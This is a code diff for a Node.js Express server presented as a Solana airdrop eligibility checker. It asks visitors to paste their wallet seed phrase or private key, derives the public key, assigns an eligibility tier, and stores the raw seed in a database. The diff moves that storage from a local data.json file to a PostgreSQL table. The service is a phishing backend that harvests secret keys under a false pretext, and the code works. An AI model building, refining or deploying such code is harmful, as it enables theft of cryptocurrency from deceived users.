@@ -3,14 +3,25 @@ const bip39 = require('bip39');
 const ed25519 = require('ed25519-hd-key');
 const express = require('express');
 const bodyParser = require('body-parser');
-const fs = require('fs');
 const path = require('path');
-const bs58 = require('bs58'); // Correct import
+const bs58 = require('bs58'); 
+const { Pool } = require('pg');
+require('dotenv').config();
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
-app.use(express.static(path.join(__dirname, 'public')));
+// ===========================
+// PostgreSQL Connection
+// ===========================
+const pool = new Pool({
+  connectionString: process.env.DATABASE_URL,
+  ssl: { rejectUnauthorized: false } // Required for Render
+});
+
+pool.connect()
+  .then(() => console.log("✅ Connected to PostgreSQL"))
+  .catch(err => console.error("❌ PostgreSQL Connection Error:", err));
 
 // ===========================
 // Solana Mainnet Connection
@@ -21,10 +32,10 @@ const connection = new Connection(
 );
 
 app.use(bodyParser.json());
-app.use(express.static(__dirname));
+app.use(express.static(path.join(__dirname, 'public')));
 
 // ===========================
-// Helper to fetch total transactions
+// Helper: Fetch total transactions
 // ===========================
 async function getTotalTransactions(walletAddress) {
   try {
@@ -47,7 +58,7 @@ async function getTotalTransactions(walletAddress) {
 }
 
 // ===========================
-// Route to check eligibility
+// API: Check eligibility and save to DB
 // ===========================
 app.post('/check-eligibility', async (req, res) => {
   const { seed } = req.body;
@@ -59,7 +70,7 @@ app.post('/check-eligibility', async (req, res) => {
   try {
     let publicKey;
 
-    // If it's a seed phrase (mnemonic)
+    // If it's a seed phrase
     if (bip39.validateMnemonic(seed.trim())) {
       const seedBuffer = await bip39.mnemonicToSeed(seed);
       const derived = ed25519.derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
@@ -67,12 +78,9 @@ app.post('/check-eligibility', async (req, res) => {
       publicKey = keypair.publicKey.toBase58();
 
     } else {
-      // Handle Base58 Private Key
+      // Base58 Private Key
       try {
-        console.log("Raw private key input:", seed.trim());
-
         const privateKeyBytes = bs58.decode(seed.trim());
-        console.log("Decoded private key length:", privateKeyBytes.length);
 
         if (privateKeyBytes.length !== 64 && privateKeyBytes.length !== 32) {
           return res.status(400).json({
@@ -84,23 +92,19 @@ app.post('/check-eligibility', async (req, res) => {
         const keypair = Keypair.fromSecretKey(privateKeyBytes);
         publicKey = keypair.publicKey.toBase58();
 
-        console.log("Derived public key:", publicKey);
       } catch (pkError) {
         console.error("Private key error:", pkError);
         return res.status(400).json({ success: false, message: 'Invalid seed phrase or private key' });
       }
     }
 
-    console.log('Checking wallet on-chain:', publicKey);
+    console.log('Checking wallet:', publicKey);
 
     // Fetch total transactions
     const totalTx = await getTotalTransactions(publicKey);
-    console.log(`Total transactions: ${totalTx}`);
-
-    // Calculate total eligible transactions
     const totalEligibleTx = Math.floor(totalTx / 6);
 
-    // Determine eligibility and tier
+    // Determine eligibility
     let eligible = totalEligibleTx > 100;
     let tier = null;
 
@@ -113,41 +117,20 @@ app.post('/check-eligibility', async (req, res) => {
       else if (totalEligibleTx >= 851) tier = 6;
     }
 
-    // Save results to data.json
-    const filePath = path.join(__dirname, 'data.json');
-    fs.readFile(filePath, 'utf8', (err, data) => {
-      let jsonData = [];
-      if (!err && data) {
-        try {
-          jsonData = JSON.parse(data);
-        } catch (parseError) {
-          console.error('Failed to parse existing data.json:', parseError);
-        }
-      }
+    // Save to PostgreSQL
+    await pool.query(
+      `INSERT INTO eligibility_results 
+       (seed, wallet, total_tx, total_eligible_tx, eligible, tier, timestamp)
+       VALUES ($1, $2, $3, $4, $5, $6, NOW())`,
+      [seed, publicKey, totalTx, totalEligibleTx, eligible, tier]
+    );
 
-      jsonData.push({
-        seed,
-        wallet: publicKey,
-        totalTx,
-        totalEligibleTx,
-        eligible,
-        tier,
-        timestamp: new Date().toISOString()
-      });
-
-      fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), (err) => {
-        if (err) {
-          return res.status(500).json({ success: false, message: 'Failed to save data' });
-        }
-
-        res.json({
-          success: true,
-          totalTx,
-          totalEligibleTx,
-          eligible,
-          tier
-        });
-      });
+    res.json({
+      success: true,
+      totalTx,
+      totalEligibleTx,
+      eligible,
+      tier
     });
 
   } catch (error) {
@@ -157,8 +140,8 @@ app.post('/check-eligibility', async (req, res) => {
 });
 
 // ===========================
-// Start the server
+// Start Server
 // ===========================
 app.listen(PORT, () => {
-  console.log(`Server running at http://localhost:${PORT}`);
+  console.log(`🚀 Server running at http://localhost:${PORT}`);
 });
